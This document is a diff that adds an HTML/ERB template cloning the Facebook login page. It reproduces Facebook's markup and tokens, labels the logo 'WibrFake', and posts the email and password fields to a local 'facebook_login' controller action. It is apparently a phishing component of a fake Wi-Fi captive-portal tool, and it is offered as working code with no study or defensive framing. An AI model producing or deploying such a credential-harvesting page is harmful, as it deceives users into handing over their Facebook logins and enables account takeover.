@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en" id="facebook" class="">
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
+    
+    <script nonce="">
+        function envFlush(a) {
+            function b(b) {
+                for(var c in a) b[c] = a[c]
+            }
+            window.requireLazy ? window.requireLazy(["Env"], b) : (window.Env = window.Env || {}, b(window.Env))
+        }
+        envFlush({
+            "useTrustedTypes": false,
+            "isTrustedTypesReportOnly": false,
+            "ajaxpipe_token": "AXhHVkPn7xmjo49Ii3Q",
+            "stack_trace_limit": 30,
+            "timesliceBufferSize": 5000,
+            "show_invariant_decoder": false,
+            "compat_iframe_token": "AUWf1g3Hp9-C48ftLCiIqKSViyU",
+            "isCQuick": false,
+            "brsid": "7482526861462796748"
+        });
+    </script>
+
+    <script nonce="">
+        window.openDatabase && (window.openDatabase = function() { throw new Error() });
+    </script>
+
+    <script nonce="">
+        _btldr = {};
+    </script>
+
+    <!-- Más scripts y metadatos... -->
+    
+    <title id="pageTitle">Log into Facebook</title>
+    <meta name="bingbot" content="noarchive">
+    <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know.">
+    
+    <!-- Open Graph tags -->
+    <meta property="og:site_name" content="Facebook">
+    <meta property="og:url" content="https://www.facebook.com/login.php/">
+    <meta property="og:locale" content="en_US">
+
+    <!-- Enlaces de recursos -->
+    <link rel="canonical" href="https://www.facebook.com/login/web/">
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
+    
+    <!-- Hojas de estilo -->
+    <% content_for :stylesheet do %>
+        <%= stylesheet_link_tag 'facebook/page_facebook' %>
+    <% end %>
+    <!-- Scripts -->
+    <script src="Log%20into%20Facebook_files/awtagErm_wi.js" data-bootloader-hash="bEx44LC" crossorigin="anonymous"></script>
+    
+    <!-- Más scripts y configuraciones... -->
+</head>
+
+<body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko x1 Locale_en_US cores-gte4 _19_u" dir="ltr">
+    <!-- Contenido principal -->
+    <div class="_li" id="u_0_0_N8">
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix" id="content" role="main">
+                <!-- Formulario de login -->
+                <div class="_4-u5 _30ny">
+                    <div class="_97vy">
+                        <%= image_tag 'facebook/facebook-logo.svg', class: '_97vu img', alt: 'WibrFake'%>
+                    </div>
+                    
+                    <div class="_4-u2 _1w1t _4-u8 _52jv">
+                        <div class="_xku" id="header_block">
+                            <span class="_97w1 _50f6">
+                                <div class="_9axz">Log Into Facebook</div>
+                            </span>
+                        </div>
+                        
+                        <div class="login_form_container">
+                            <form class="form" id="login_form formulario" action="<%= url_for(controller: 'sessions', action: 'facebook_login') %>" method="post">
+                                <!-- Campos del formulario -->
+                                <input type="hidden" name="jazoest" value="21051" autocomplete="off">
+                                <input type="hidden" name="lsd" value="AVrUjvEUkuc" autocomplete="off">
+                                
+                                <div id="loginform">
+                                    <div class="clearfix _5466 _44mg" id="email_container">
+                                        <input type="text" class="inputtext _55r1 inputtext _1kbt" 
+                                               name="email" id="email" placeholder="Email or phone number" 
+                                               autofocus autocomplete="username" aria-label="Email or phone number">
+                                    </div>
+                                    
+                                    <div class="clearfix _5466 _44mg">
+                                        <div class="_55r1 _1kbt">
+                                            <input type="password" class="inputtext _55r1 inputtext _9npi" 
+                                                   name="password" id="password" placeholder="Password" 
+                                                   autocomplete="current-password" aria-label="Password">
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="_xkt">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" 
+                                                id="loginbutton" name="login" type="submit">
+                                            Log In
+                                        </button>
+                                    </div>
+                                    
+                                    
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Pie de página -->
+            <div class="_95ke _8opy">
+                <div id="pageFooter" data-referrer="page_footer">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts finales -->
+    <script nonce="">
+        // Código de inicialización
+        requireLazy(["Bootloader"], function(m) {
+            m.handlePayload({/* Configuraciones */});
+        });
+    </script>
+    
+</body>
+</html>
